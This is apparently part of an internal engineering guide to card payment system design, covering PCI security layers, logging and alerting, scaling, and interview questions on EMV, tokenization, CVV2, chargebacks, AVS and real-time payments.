  → AES-256 for any stored sensitive data
  → HSM for all cryptographic key operations
  → Tokenization for card numbers
  → Data minimization (only store what you absolutely need)
  → Automatic data expiration (purge 7-year-old audit logs)

LAYER 5: Access Control
  → Multi-factor authentication for all CDE access
  → Role-based access control (RBAC)
  → Just-in-time access (request access for a specific task, auto-expire)
  → No shared accounts — every person has their own credentials
  → Privileged access management (PAM) for admin operations
  → All admin sessions recorded and auditable

LAYER 6: Monitoring & Response
  → SIEM (Security Information and Event Management) with real-time alerting
  → Anomaly detection on transaction patterns
  → Automated incident response playbooks
  → 24/7 SOC (Security Operations Center) for P1 incidents
  → Mean Time To Detect (MTTD): target < 1 hour
  → Mean Time To Respond (MTTR): target < 4 hours
```

### Engineering Tradeoffs

| Control | Security Benefit | Cost / Tradeoff |
|---|---|---|
| HSM for all crypto | Highest key security | Expensive hardware, operational complexity |
| 3DS2 on all transactions | Liability shift, reduced fraud | ~10-15% checkout abandonment |
| Hosted fields | Eliminates PCI scope | Less UI customization flexibility |
| Short session tokens (15 min) | Limits stolen token damage | More authentication friction |
| AVS check required | Confirms billing address | Some valid cards fail AVS, lost revenue |
| CVV required always | Blocks many carding attacks | Minor friction, some CNP cards lack CVV |
| Certificate pinning | Prevents MITM | Pin rotation causes outages if mismanaged |
| Real-time fraud scoring | Catches fraud immediately | ~50-150ms latency per transaction |

---

## 12. Observability

### What to Log

```json
// Transaction authorized
{
  "timestamp": "2024-11-15T10:30:45.123Z",
  "event_type": "payment.authorized",
  "transaction_id": "txn_550e8400-e29b-41d4-a716-446655440000",
  "merchant_id": "mer_FRESHMART001",
  "amount_cents": 4723,
  "currency": "usd",
  "card_token": "tok_1A2b3C4d5E6f7G8h",
  "card_last4": "1111",
  "card_brand": "visa",
  "card_exp_month": 11,
  "card_exp_year": 2026,
  "auth_code": "AUTH47",
  "response_code": "00",
  "avs_result": "Y",
  "cvv_result": "M",
  "risk_score": 23,
  "entry_mode": "chip_pin",
  "network_transaction_id": "VISA20241115103045001",
  "ip_hash": "sha256:a1b2c3d4...",    // NEVER log raw IP
  "device_fingerprint_hash": "sha256:e5f6...",
  "latency_ms": 487,
  // NEVER LOG: PAN, CVV, PIN, ARQC, full track data
}

// Fraud detected
{
  "timestamp": "2024-11-15T10:31:00.000Z",
  "event_type": "payment.declined.fraud",
  "transaction_id": "txn_...",
  "merchant_id": "mer_...",
  "amount_cents": 99900,
  "risk_score": 87,
  "risk_reasons": ["card_velocity_high", "new_merchant", "amount_atypical"],
  "decline_code": "U16",
  "severity": "HIGH"
}

// Security event
{
  "timestamp": "2024-11-15T10:32:00.000Z",
  "event_type": "security.carding_detected",
  "merchant_id": "mer_...",
  "ip_hash": "sha256:...",
  "attempted_cards_1h": 847,
  "decline_rate": 0.94,
  "action": "ip_blocked",
  "severity": "CRITICAL"
}
```

### What Never Goes in Logs (PCI Requirement 3.2)

```
NEVER LOG:
  - Full PAN (log only first 6 + last 4: 411111XXXXXX1111)
  - CVV/CVC (never, under any circumstances)
  - PIN or encrypted PIN block
  - ARQC/ARPC (EMV cryptograms)
  - Full track data
  - Full card expiry (log only year, not month+year combined is debated)

LOG SCRUBBING:
  // Pattern to detect and redact accidentally logged PANs:
  PAN_PATTERN = /\b\d{13,19}\b/g
  // Apply to all log output before writing to log aggregator
  scrubbed_log = log_message.replace(PAN_PATTERN, '[PAN_REDACTED]')
```

### Metrics

```
Business Metrics:
  payment.authorization.rate        // % of auth attempts that succeed
  payment.authorization.latency     // p50, p95, p99
  payment.settlement.lag            // Time from auth to settlement
  payment.chargeback.rate           // % of transactions that get charged back
  payment.fraud.rate                // % of fraudulent transactions
  payment.volume.dollars            // Total dollar volume processed
  payment.volume.count              // Total transaction count

Technical Metrics:
  card_network.response_time{network=visa|mastercard}
  issuer.response_time{issuer=*}
  iso8583.queue.depth               // Are we falling behind on processing?
  hsm.operations.latency            // HSM performance
  token_vault.lookup.latency        // Tokenization performance
  kafka.consumer.lag{topic=payments}

Security Metrics:
  payment.decline_rate{reason=cvv_mismatch|insufficient_funds|fraud}
  payment.carding_attempts_blocked  // Active attacks stopped
  api_key.auth_failures             // Potential credential stuffing
  webhook.signature_failures        // Forged webhook attempts
  pci_scope.pan_access{user=*}      // Who is accessing tokenized PANs
```

### Alerting Rules

| Alert | Threshold | Severity | Action |
|---|---|---|---|
| Authorization success rate < 80% | < 80% | CRITICAL | Page on-call, check card network status |
| Authorization latency p99 > 5s | > 5 seconds | HIGH | Engineering alert, investigate bottleneck |
| Fraud decline rate > 5% | > 5% | HIGH | Fraud team review, potentially tighten model |
| Single merchant decline rate > 50% | > 50% | HIGH | Carding attack suspected, contact merchant |
| Chargeback rate > 1% | > 1% | HIGH | Risk team review, potential merchant suspension |
| CVV mismatch rate > 20% | > 20% | CRITICAL | Active carding attack, rate limit/block IPs |
| Webhook signature failures > 10/min | > 10/min | HIGH | Forged webhook attack |
| HSM operation latency > 200ms | > 200ms | HIGH | HSM performance issue |
| PAN access by unexpected user | Any | CRITICAL | Immediate investigation |
| Test API key in production | Any | CRITICAL | Immediate block + investigation |
| Settlement batch failure | Any | HIGH | Finance team alert |
| Normal auth traffic during business hours | - | No alert | Expected |
| Individual card declined (insufficient funds) | - | No alert | Normal |
| Standard fraud decline (score 70) | - | No alert | Risk engine working correctly |

---

## 13. Scaling Considerations

### The Scale Challenge

**Global card payment volumes:**
- Visa: ~200 billion transactions/year = ~6,000 TPS average, 65,000+ TPS peak
- Mastercard: ~120 billion transactions/year
- Combined card networks: more than any other payment system

**Payment processor scale (Stripe):**
- Processes hundreds of billions of dollars annually
- Must handle Black Friday: 10x+ normal load

---

### Bottlenecks and Solutions

**Bottleneck 1: Card Network Authorization Latency**

The card network path (issuer authorization) is the dominant latency:
```
Processor → Card Network → Issuer → Fraud Model → Back
                          └── 50-300ms here alone
```

Solutions:
- Distributed issuer infrastructure (multiple data centers, geo-routing)
- In-memory account data (balance, status in Redis at issuer)
- Pre-computed risk features (update features asynchronously, access synchronously)
- Circuit breaker: if issuer doesn't respond in 3 seconds, apply stand-in processing rules

**Bottleneck 2: HSM Throughput**

HSMs are hardware and have fixed throughput (typically 2,000-20,000 operations/second per unit):

```
At 10,000 TPS, each needing 2 HSM operations:
  Required: 20,000 HSM ops/second
  Single HSM: 5,000 ops/second
  Solution: HSM cluster of 4+ units with load balancing
```

HSMs cannot be scaled infinitely like software — each unit is $50,000-$500,000 and has firmware limitations. Careful capacity planning required.

**Bottleneck 3: ISO 8583 Connection Management**

Each POS terminal maintains a persistent TCP connection to the acquirer. At scale:
```
500,000 POS terminals × 1 TCP connection = 500,000 open connections
Each connection: ~4KB kernel state
Total: 2GB just for TCP connection state

Solution: Connection multiplexing (multiple terminals share an aggregator)
          Aggregators connect to acquirer's central servers
```

**Bottleneck 4: Settlement Database Writes**

At 10,000 TPS, settlement records must be written:
```
10,000 transactions/second × 2 DB writes/transaction = 20,000 writes/second
Single PostgreSQL: 10,000-50,000 writes/second (depends on hardware)
Settlement can be batched: write in micro-batches every 100ms
```

---

### Horizontal vs. Vertical Scaling

| Component | Scaling Strategy | Notes |
|---|---|---|
| Payment API servers | Horizontal (stateless) | Scale out easily |
| Risk engine | Horizontal (stateless ML inference) | Each instance loads same model |
| ISO 8583 gateway | Horizontal + connection pooling | Must manage stateful connections |
| Token vault | Horizontal reads, careful write coordination | Consistency is critical |
| HSM cluster | Horizontal (buy more HSM hardware) | Expensive; capacity plan carefully |
| PostgreSQL | Read replicas + partitioning | Write path is harder to scale |
| Kafka | Partition by merchant_id | Natural distribution of load |
| Settlement | Horizontal batch workers | Process different merchant batches in parallel |

---

### Consistency Tradeoffs

**The fundamental financial consistency requirement:**

For money, eventual consistency is generally unacceptable. If Alice's account is debited, the ledger must reflect this atomically. However, in practice:

```
Authorization: STRONGLY CONSISTENT
  - The issuer's authorization must atomically deduct from available balance
  - Cannot have two authorizations each seeing the full balance
  - Distributed locking at issuer: only one auth request per PAN at a time

Settlement: EVENTUALLY CONSISTENT IS ACCEPTABLE
  - Settlement happens in batch (hours after auth)
  - Slight inconsistency in settlement timing is fine
  - The authorization already captured the economic intent

Reporting / Analytics: EVENTUAL CONSISTENCY
  - Dashboard showing revenue updated with 5-minute lag is fine
  - No financial impact from slightly stale analytics data
```

**Database Partitioning for Settlement:**

```sql
-- Partition transactions by created_at for efficient batch processing
CREATE TABLE transactions (...)
PARTITION BY RANGE (created_at);

CREATE TABLE transactions_2024_q4
PARTITION OF transactions
FOR VALUES FROM ('2024-10-01') TO ('2025-01-01');

-- Settlement worker queries only relevant partition:
SELECT * FROM transactions_2024_q4
WHERE status = 'authorized' AND created_at < NOW() - INTERVAL '1 hour'
LIMIT 1000
FOR UPDATE SKIP LOCKED;  -- Multiple workers, no conflicts
```

**SKIP LOCKED** allows multiple settlement workers to process different batches simultaneously without locking conflicts. Each worker grabs its own chunk of rows to process.

---

## 14. Interview Questions

### Q1: "Explain why an EMV chip card transaction is fundamentally more secure than a magnetic stripe transaction."

**Complete Answer:**

A magnetic stripe stores static data — the card number, expiry, and service codes never change. Anyone who reads the stripe once (a card skimmer, a dishonest cashier) has everything needed to clone the card. The magnetic stripe cannot distinguish "was this data read legitimately at a POS terminal?" from "was this data stolen and replayed?"

An EMV chip is a microprocessor that performs cryptographic operations. For every transaction, the chip computes an ARQC (Authorization Request Cryptogram) using TRIPLE-DES:

```
ARQC = 3DES(
  transaction_data + amount + date + ATC + UNPREDICTABLE_NUMBER,
  card_specific_key_derived_from_issuer_master_key
)
```

The unpredictable number is generated fresh by the terminal for each transaction. Even if an attacker captures the complete ARQC, it cannot be reused because:
1. The ATC (Application Transaction Counter) increments with each use — the issuer rejects any transaction with an ATC lower than or equal to the last seen
2. The unpredictable number is different each time — the ARQC is mathematically tied to a specific terminal's nonce
3. Only the issuer's HSM can verify the ARQC using the derived card key

The issuer verifies the ARQC by recomputing it using their master derivation key. If they match, the chip is genuine. If they don't, the card is a counterfeit.

**What if → someone compromises the terminal's unpredictable number?**
The ARQC is still bound to the specific amount, date, and ATC. Even with the UNP known in advance, the ARQC only authorizes the specific transaction data it was computed with. A fraudster couldn't use it to authorize a different amount or on a different day.

---

### Q2: "What is the difference between authorization and capture/settlement? Why does this distinction exist?"

**Complete Answer:**

**Authorization** is the real-time check: "Does this cardholder have funds available, and does the issuer approve this transaction?"
- Happens in 200-800ms
- Reserves the funds (reduces available balance by the authorized amount)
- Does NOT move money
- Produces an authorization code (e.g., "AUTH47")
- Authorization holds typically expire in 7 days if not captured

**Capture/Settlement** is the actual fund movement:
- Happens in batch (typically T+1 to T+2 business days)
- Moves money from issuer → card network → acquirer → merchant
- Triggers via clearing files submitted end of day
- Netting reduces actual wire transfers

**Why this separation exists:**

1. **For merchants with variable fulfillment:** Hotels authorize at check-in, capture at check-out (you might stay 1-3 nights — they don't know the final amount). Airlines authorize immediately, capture when your bag fee is determined. Physical stores might ship different items than you ordered.

2. **For merchants who need time to verify orders:** High-value orders might be manually reviewed for fraud before capturing. If fraud is detected, you void the authorization without ever moving money.

3. **For efficiency:** Netting millions of transactions reduces wire transfer volume. If Chase customers spent $5M at Target today and Target customers moved $3M to Chase, the net transfer is just $2M from Chase to Target's bank, not millions of individual transfers.

**What if → the merchant captures more than the authorized amount?**
Card networks allow a tolerance (typically ±20% for some MCCs like restaurants where tips are added). Beyond that, the additional amount may be declined or subject to surcharge.

---

### Q3: "How does tokenization work and why does it reduce PCI scope?"

**Complete Answer:**

**Tokenization mechanics:**

A token is a random string that maps to a PAN via a lookup table in a secure vault. The token:
- Is random (not derived from the PAN — cannot be reversed)
- Is scoped (may only work for specific merchants, specific amounts, or specific channels)
- Is stored by the merchant instead of the real PAN

```
PAN: 5111111111111111
Token: tok_1A2b3C4d5E6f7G8h

Token vault (in HSM-protected system):
  tok_1A2b3C4d5E6f7G8h → AES256_ENCRYPT(5111111111111111, vault_key)

When merchant needs to charge again:
  Merchant sends: {token: "tok_1A2b3C4d5E6f7G8h", amount: 2999}
  Processor: looks up PAN in vault, authorizes with real PAN
  Merchant never sees the real PAN
```

**PCI Scope Reduction:**

PCI DSS defines the CDE (Cardholder Data Environment) as any system that stores, processes, or transmits PANs. If you have 100 servers but only 3 handle PANs, only 3 are in scope.

With tokenization:
- Merchant servers: store tokens only → NOT in PCI scope
- Merchant's web server: JavaScript submits directly to processor → NOT in scope
- Merchant's database: contains only tokens → NOT in scope

The merchant goes from SAQ D (the full 300+ control assessment) to SAQ A (a ~22-control self-assessment). This saves millions in compliance costs for large merchants.

**What if the token vault is breached?**
The attacker gets encrypted PANs. The encryption key is in the HSM. Without the HSM decryption, the encrypted PANs are useless. But this is the most critical system to protect — if both the vault and the HSM key are compromised, all tokenized PANs are exposed. This is why token vaults have the strictest security controls in the stack.

---

### Q4: "Walk me through exactly what happens when an issuer's authorization system is down. How does the payment system handle this?"

**Complete Answer:**

When an issuer's system is unavailable, several "stand-in" mechanisms activate:

**Mechanism 1: Card Network Stand-In Processing**

Visa and Mastercard maintain their own authorization capability for when issuers go offline:

```
Normal flow: Card Network → Issuer → Decision
Stand-in flow: Card Network → Stand-In Processor → Decision

Visa's stand-in knows:
  - Your card's credit limit (updated from issuer periodically)
  - Your current outstanding balance (approximated)
  - Whether card is reported stolen (hot-card file)

Visa approves based on these approximate values.
Risk: They might approve a transaction the issuer would decline (insufficient funds).
```

**Mechanism 2: Floor Limit Processing (POS Terminals)**

Terminals can be configured with a "floor limit" — a maximum amount they can approve offline:

```
Floor limit: $50
Transaction < $50: Terminal approves without contacting acquirer
Transaction ≥ $50: Terminal must go online for authorization

Risk: A card reported stolen can still make offline transactions up to $50.
Mitigation: EMV chip tracks floor limit transactions; issuer sees them at settlement.
```

**Mechanism 3: Referral**

For large transactions where stand-in is unavailable and floor limit is insufficient:
- Terminal displays: "CALL BANK FOR AUTHORIZATION"
- Cashier calls a telephone number at the issuer
- Issuer agent manually authorizes (or declines)
- Agent provides voice authorization code

**What happens at settlement?**
- Stand-in transactions: Issuer sees them at clearing. If the issuer would have declined (card actually over limit), they accept liability anyway — they agreed to stand-in terms with the network.
- Floor limit transactions: EMV chip records them; issuer processes at clearing and can flag.

**The interplay with fraud:**
A fraudster who knows which issuers are currently offline might specifically target those issuers' cards. This is why networks don't publicly announce which issuers are experiencing issues.

---

### Q5: "Why does CVV2 get checked for online (CNP) transactions but not typically for card-present transactions? And why is CVV2 the 'weakest' security control?"

**Complete Answer:**

**Card-present vs. card-not-present CVV usage:**

For card-present transactions, the physical card presence and PIN are stronger proofs than CVV2. The POS terminal reads CVV1 (stored in the magnetic stripe, different from CVV2). For EMV chip, the chip cryptogram (ARQC) is far stronger than any static value.

For card-not-present (online), CVV2 is the primary "card possession" indicator — only someone with the physical card in hand should be able to see the 3-digit code on the back (or 4-digit on the front for Amex).

**Why CVV2 is weak:**

1. **Static value**: CVV2 never changes. Once stolen (via formjacking, data breach, etc.), it's valid until the card expires or is replaced.

2. **Cannot be stored** (PCI DSS requirement 3.2): After authorization, you must delete CVV2. But before authorization, merchants must transmit it. This in-transit window is the target for formjacking.

3. **16 digits + 3 digits**: An attacker who has a valid PAN can try all 1000 possible CVV2 values (000-999). With no rate limiting at a merchant, this takes <17 minutes at 1 transaction/second. Even with issuer-level blocking after 3 failures, sophisticated attackers distribute attempts across many issuers.

4. **Phishable**: A fake checkout page captures CVV2 directly from the cardholder.

**CVV2 vs. EMV chip cryptogram:**

```
CVV2: 3 static digits — the same for every transaction
ARQC: 8 bytes (64 bits) of entropy — unique per transaction
  Computed using: transaction data + ATC + unpredictable number + card key
  Cannot be determined in advance
  Cannot be reused
  Forgery would require breaking 3DES — computationally infeasible
```

CVV2 is a weak control kept because of the limitations of card-not-present transactions — without a chip reader, there's no better alternative available to all merchants. 3DS2 with hardware authentication (FIDO2) is the direction the industry is moving.

---

### Q6: "How do chargebacks work mechanically, and what's the engineering response to reduce chargeback rates?"

**Complete Answer:**

**The chargeback process (timeline):**

```
Day 0: Transaction occurs
Day 1-120: Cardholder disputes with issuer
  → Cardholder calls bank: "I didn't authorize this" or "Item not received"
  → Issuer reviews claim

Day 1-5: Issuer initiates chargeback
  → Issues a "retrieval request" asking merchant for transaction details
  → Merchant has 10-30 days to respond

Day 5-30: Merchant response (via acquirer)
  → Acquirer sends merchant's evidence to card network
  → Evidence: signed receipt, delivery confirmation, 3DS authentication proof, IP logs

Day 30-120: Card network arbitrates
  → Network reviews both sides
  → Decision: merchant wins (chargeback reversed) or issuer wins (chargeback stands)
  → If merchant loses: $amount + $15-100 chargeback fee deducted from merchant account

Day 120+: Second chargeback (pre-arbitration)
  → Some disputes can be re-presented by the merchant
  → Additional evidence, another arbitration round
```

**Financial impact:**
- Merchant loses: sale amount + chargeback fee
- If chargeback rate > 1% of transactions: Mastercard / Visa put merchant in a "High Chargeback Program"
- >1.5% for 2+ months: merchant may lose ability to process cards (terminated)
- Some industries (adult content, gambling, supplements) have persistent chargeback issues

**Engineering controls to reduce chargebacks:**

```python
# 1. Track "fraud indicator" customers
def should_require_3ds(customer_id: str, amount: int) -> bool:
    # Check customer's chargeback history
    chargeback_rate = get_customer_chargeback_rate(customer_id, days=90)
    if chargeback_rate > 0.05:  # 5% of this customer's transactions disputed
        return True

    # High value always needs 3DS
    if amount > 10000:  # $100
        return True

    # New customer with unusual pattern
    customer_age_days = get_customer_age(customer_id)
    if customer_age_days < 30 and amount > 5000:
        return True

    return False

# 2. Require signature confirmation for physical goods > threshold
def fulfillment_requirements(order):
    if order.value_cents > 10000:  # $100
        return {"require_signature": True, "provider": "fedex"}
    return {"require_signature": False}

# 3. Digital goods: preserve evidence
def record_digital_delivery(user_id, product_id, txn_id):
    db.insert("digital_deliveries", {
        "transaction_id": txn_id,
        "user_id": user_id,
        "product_id": product_id,
        "ip_hash": sha256(request.remote_addr),
        "user_agent": request.user_agent,
        "download_timestamp": datetime.utcnow(),
        "download_url_hash": sha256(download_url)
    })
    # This evidence is presented during chargeback dispute

# 4. Automated chargeback response
def respond_to_chargeback(chargeback):
    evidence = gather_evidence(chargeback.transaction_id)
    if evidence.has_3ds_authentication:
        return respond_with_3ds(evidence)  # Strong case — liability shifted
    elif evidence.has_delivery_signature:
        return respond_with_delivery(evidence)
    elif evidence.has_digital_access_logs:
        return respond_with_digital_evidence(evidence)
    else:
        return accept_chargeback()  # No evidence, accept the loss
```

---

### Q7: "What is ISO 8583 and why do financial systems use binary formats instead of JSON or XML?"

**Complete Answer:**

ISO 8583 is the international standard for card transaction messaging, first published in 1987. It defines a binary message format used between merchants, acquirers, card networks, and issuers.

**Structure of an ISO 8583 message:**

```
+------------------+
| Message Type     | 2 bytes: 0100 = Auth Request, 0110 = Auth Response
| Indicator (MTI)  |
+------------------+
| Primary Bitmap   | 8 bytes: 64 bits, each 1 = corresponding field present
+------------------+
| Secondary Bitmap | 8 bytes (optional): fields 65-128
+------------------+
| Field 1 data     | Variable length, format defined by bitmap
| Field 2 data     |
| ...              |
| Field N data     |
+------------------+
```

**Why binary instead of JSON/XML?**

**1. Performance at extreme scale:**
```
JSON authorization request: ~500-2000 bytes (parsing required)
ISO 8583 equivalent: ~100-200 bytes (binary, direct memory access)

At 65,000 TPS (Visa peak):
  JSON: 65,000 × 2,000 bytes = 130 MB/second of raw data to parse
  ISO 8583: 65,000 × 150 bytes = ~10 MB/second to process

Text parsing (JSON) is CPU-intensive.
Binary parsing is memory-mapped → near-zero CPU overhead.
```

**2. Precision for financial data:**
```
JSON "amount": 47.23 — floating point, imprecise
ISO 8583 field 4: "000000004723" — fixed decimal, precise (paise/cents)

Never use floating point for money. ISO 8583's fixed-length numeric fields
prevent the floating-point bugs that have caused many accounting disasters.
```

**3. Historical compatibility:**
Financial systems have been running since the 1970s. The mainframes and AS/400 systems at many banks were designed around fixed-length binary records. Changing them is a multi-year project. ISO 8583 was designed to work with these existing systems.

**4. Compact on-wire representation:**
Every byte saved × billions of transactions per year matters for network capacity.

**Modern evolution:**
ISO 20022 is the next-generation standard using XML (and increasingly JSON) with rich data structures. Many banks are migrating to ISO 20022 for SWIFT payments and new payment rails. UPI (India) uses XML-based messaging. But core card transaction processing still primarily uses ISO 8583 for the real-time path due to performance requirements.

---

### Q8: "What would happen to your payment system if the card network (Visa) declared a major incident for 2 hours?"

**Complete Answer:**

This is a business continuity scenario. A VisaNet outage means:

**Immediate impact:**
- All Visa card authorizations fail (or fall to stand-in processing if available)
- Merchants see: ISO 8583 response code "91" = Issuer Unavailable
- POS terminals display: "Your card cannot be processed at this time"
- E-commerce: 402/503 errors returned to customers

**System behavior without card network:**

```
Physical terminals:
  - Floor limit: transactions < $25-50 approved offline
  - EMV chip records offline decisions
  - Batch submission when connectivity restored

Online merchants:
  - Payment processor cannot route Visa cards
  - Processor may have fallback: "Try again with a Mastercard"
  - Some processors queue transactions for retry (risky — customer may retry manually)

Acquirers:
  - Queue ISO 8583 messages for retry with exponential backoff
  - Notify merchant portals of degraded status
  - Switch traffic to Mastercard if merchant accepts it

Card networks:
  - VisaNet itself is redundant across data centers
  - True network outage would trigger disaster recovery
  - BGP failover routes traffic to secondary DC in ~10 minutes
```

**What payment processors do:**

```python
class CardNetworkCircuitBreaker:
    def __init__(self):
        self.failure_count = 0
        self.last_failure = None
        self.state = "CLOSED"  # CLOSED=normal, OPEN=failing, HALF_OPEN=testing

    def call_visa_network(self, request):
        if self.state == "OPEN":
            # Don't even try — we know Visa is down
            if time.time() - self.last_failure > 30:
                self.state = "HALF_OPEN"  # Try again after 30 seconds
            else:
                raise NetworkUnavailable("Visa network unavailable")

        try:
            result = actual_visa_call(request)
            if self.state == "HALF_OPEN":
                self.state = "CLOSED"  # Recovery confirmed
                self.failure_count = 0
            return result
        except TimeoutError:
            self.failure_count += 1
            self.last_failure = time.time()
            if self.failure_count > 5:
                self.state = "OPEN"  # Trip the breaker
            raise
```

**Customer experience engineering:**
- Status page (status.stripe.com) updates in real-time
- Checkout pages show "Visa unavailable — please try Mastercard or PayPal"
- Retry logic with clear messaging: "Processing delayed — your card has not been charged yet"

**Financial impact:**
- Visa down 2 hours during business hours: millions of transactions fail
- This has happened: Visa had a major outage in June 2018 that lasted ~10 hours in Europe
- Merchants see: revenue drop proportional to Visa card usage (typically 50-60% of cards are Visa)
- Visa compensates merchants for documented losses per their service agreements

---

### Q9: "How does the Address Verification System (AVS) work and why is it used for fraud prevention?"

**Complete Answer:**

AVS (Address Verification System) is a service provided by card networks where the card issuer compares the billing address provided in a CNP transaction against the address on file for the card.

**Mechanics:**

```
Customer submits at checkout:
  Billing ZIP: 78701
  Billing street: "123 Main St"

Merchant sends to issuer in authorization (ISO 8583 fields):
  Field 123: ZIP = "78701"
  Field 124: Street = "123"  (only numeric portion of street)

Issuer checks against their cardholder database:
  ZIP on file: "78701" → MATCH
  Street number on file: "123" → MATCH

Issuer returns AVS result code (single character):
  Y = Full match (zip + street)
  Z = Zip match only
  A = Street match only
  N = No match
  U = Unavailable (international cards often can't verify)
  G = Non-US card
  R = Retry
```

**How merchants use AVS results:**

```python
def evaluate_avs_result(avs_code: str, amount: int) -> str:
    if avs_code == "Y":  # Full match
        return "PROCEED"
    elif avs_code == "Z":  # ZIP only
        if amount < 5000:  # < $50: accept
            return "PROCEED"
        else:
            return "REVIEW"
    elif avs_code == "A":  # Street only
        return "REVIEW"  # Always review
    elif avs_code == "N":  # No match
        return "DECLINE"  # Likely fraud or wrong address
    elif avs_code in ("U", "G"):  # Unavailable / international
        return "PROCEED"  # Can't verify international — accept the risk
    else:
        return "REVIEW"
```

**AVS limitations:**

1. **Only verifies US billing addresses**: International addresses often return U (unavailable). Cannot verify beyond numeric components.

2. **Customer friction**: Customers with multiple addresses or recent moves fail AVS. "I moved last month and forgot to update my billing address" = AVS fail = legitimate purchase declined.

3. **Not CVV**: AVS doesn't prove card possession, only address knowledge. A fraudster who obtained card data through a data breach may have the billing address too.

4. **The tradeoff**: Requiring full AVS match (`Y`) catches more fraud but declines more legitimate transactions. Most merchants accept `Y` and `Z` (zip match), decline `N`, and manually review `A`.

**Integration with 3DS2**: Modern risk-based authentication combines AVS, CVV, device fingerprint, behavioral data, and 3DS2 authentication. AVS alone is insufficient for high-value transactions.

---

### Q10: "What is the difference between a payment processor (Stripe), an acquirer (Chase Paymentech), and a card network (Visa)? When would a large merchant bypass the payment processor?"

**Complete Answer:**

**Payment Processor (Stripe, Adyen, Braintree):**
- Provides the technical integration layer for merchants
- Offers APIs, hosted payment pages, fraud tools, reporting
- Manages PCI compliance on behalf of merchants (hosted fields, tokenization)
- Typically works through an acquirer (or IS an acquirer)
- Cost: 2.9% + $0.30/transaction (Stripe standard pricing)
- Best for: businesses that want to move fast without banking relationships

**Acquirer (Chase Paymentech, Wells Fargo Merchant Services, Worldpay):**
- Has a direct relationship with card networks (Visa/Mastercard certified member)
- Maintains a merchant account (where funds are deposited)
- Takes on the risk of merchant failures (must pay chargebacks even if merchant is out of business)
- Connected to card networks via direct private circuits
- Costs: interchange pass-through + small markup (often <0.3% for large merchants)
- Best for: large merchants who negotiate directly for lower rates

**Card Network (Visa, Mastercard, Amex):**
- NOT a bank — does not hold cardholder accounts
- Provides the rules (interchange rates, dispute processes, security standards)
- Operates the switching network (VisaNet, Banknet)
- Makes money from: network fees, data licensing
- Does NOT process payments directly for merchants

```
Typical integration paths:

Small merchant (< $1M/year):
  Merchant → Stripe → [Stripe's acquirer] → Visa → Issuer

Medium merchant ($1M-$1B/year):
  Merchant → Stripe/Adyen → [Their embedded acquirer] → Visa → Issuer
  OR
  Merchant → [Direct acquirer, e.g., Chase Paymentech] → Visa → Issuer

Large merchant (> $1B/year, e.g., Amazon, Walmart):
  Merchant's own POS/payment system → [Direct acquirer] → Visa → Issuer
  OR: Merchant has their own acquirer license (rare, expensive)
```

**When large merchants bypass payment processors:**

At $10B+ transaction volume, even 0.1% difference in processing fees = $10M/year.

Large merchants negotiate:
1. **Direct acquiring relationship**: Use Chase Paymentech or Worldpay directly, no Stripe middleman
2. **Interchange optimization**: Their MCC (Merchant Category Code) and transaction mix affects interchange. Large merchants have teams that optimize this.
3. **Multi-acquirer strategy**: Use different acquirers for different geographies (Barclays in Europe, Chase in US) for regulatory and cost optimization
4. **Gateway redundancy**: If one acquirer's system goes down, switch to backup acquirer without customer disruption

What you lose by bypassing processors:
- Stripe/Adyen handle PCI compliance complexity
- Their fraud tools (Stripe Radar, Adyen's Risk)
- Their 3DS2 integration
- Developer-friendly APIs
- Hosted payment pages

Large merchants must build this infrastructure themselves, justifying the investment only at very high volume.

---

### Q11: "How does the industry's shift toward real-time payments (FedNow, RTP) affect card transaction processing?"

**Complete Answer:**

Real-time payment (RTP) networks like FedNow (launched 2023) and The Clearing House's RTP network are fundamentally different from card networks:

```
Card Transaction:
  → Authorization: real-time (~500ms)
  → Actual fund movement: 1-3 business days
  → Reversible: yes (chargebacks, refunds)
  → Works offline (chip/floor limits)
  → Consumer protection: extensive chargeback rights

Real-Time Payments (FedNow/RTP):
  → Authorization: real-time (~seconds)
  → Actual fund movement: REAL-TIME (seconds, not days)
  → Generally irreversible (like cash)
  → Requires internet connectivity
  → Consumer protection: limited (no chargeback rights by default)
```

**Impact on card processing:**

1. **Account-to-account payments** for B2B reduce card usage: businesses paying suppliers can use RTP instead of cards (no interchange fees, real-time finality). Card networks lose B2B volume.

2. **No interchange**: RTP has no interchange fees ($0 vs. 1.5-3.5% for cards). Merchants prefer RTP for acceptance cost, but lose chargeback protection.

3. **Fraud implications**: Real-time and irreversible = fraud is harder to recover. Card's authorization→settlement delay actually serves as a fraud detection window. RTP requires stronger front-end fraud detection.

4. **Card networks adapting**: Visa's "push payments" (Visa Direct) enable real-time card-based transfers. Mastercard has similar capabilities. Card networks are racing to compete with bank-direct RTP.

5. **Consumer experience**: For consumers, the chargeback right is powerful — they can dispute a charge if goods aren't delivered. With RTP, once sent, it's gone. This limits RTP adoption for consumer purchases until consumer protection frameworks catch up.

**The hybrid future:**
Large purchases (real estate, cars) → RTP (large amounts, B2B)  
Consumer retail → cards (protection, points, credit)  
P2P transfers → RTP (Zelle, Venmo built on RTP rails)  
International → cards + SWIFT (RTP is largely domestic)

---

*Document version: 1.0 | Classification: CONFIDENTIAL — Internal Engineering*  
*PCI DSS scope: This document describes architecture; actual compliance requires QSA assessment.*  
*Card network specifics are based on publicly available documentation; proprietary VisaNet/Banknet internals are industry-inferred.*  
*Do not distribute externally.*
